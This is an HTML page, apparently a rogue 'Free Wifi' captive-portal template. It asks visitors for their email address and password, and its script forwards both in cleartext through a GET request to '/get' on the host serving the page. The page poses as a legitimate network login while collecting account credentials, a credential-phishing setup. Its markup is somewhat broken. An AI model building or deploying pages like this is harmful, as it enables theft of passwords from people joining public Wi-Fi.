<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
        }
        .login-container h1, .login-container h2 {
            text-align: center;
        }
        .login-container button {
            width: 100%;
            background-color: #ee2722;
        }
        #logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
    </style>
    <script>
        window.addEventListener('DOMContentLoaded', (event) => {
            const form = document.getElementById('email-form-step');
            form.addEventListener('submit', (event) => {
                event.preventDefault();
                const emailInput = document.getElementById('email-input');
                const passwordInput = document.getElementById('password-input');
                const email = emailInput.value;
                const password = passwordInput.value;
                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
                window.location.href = url;
            });
        });
    </script>
</head>

        <div class="row">

                </div>
                <form id="email-form-step">
                    <h1>Sign into Free Wifi</h1>
                    <h2>Use your email address to log in</h2>
                    <div class="form-group">
                        <input id="email-input" name="email" type="text" class="form-control" placeholder="Email Address" required>
                    </div>
                    <div class="form-group">
                        <input id="password-input" name="password" type="password" class="form-control" placeholder="Password" required>
                    </div>
                    <div class="form-group">
                        <button class="btn btn-primary" type="submit">Next</button>

        </div>
    </div>
</body>
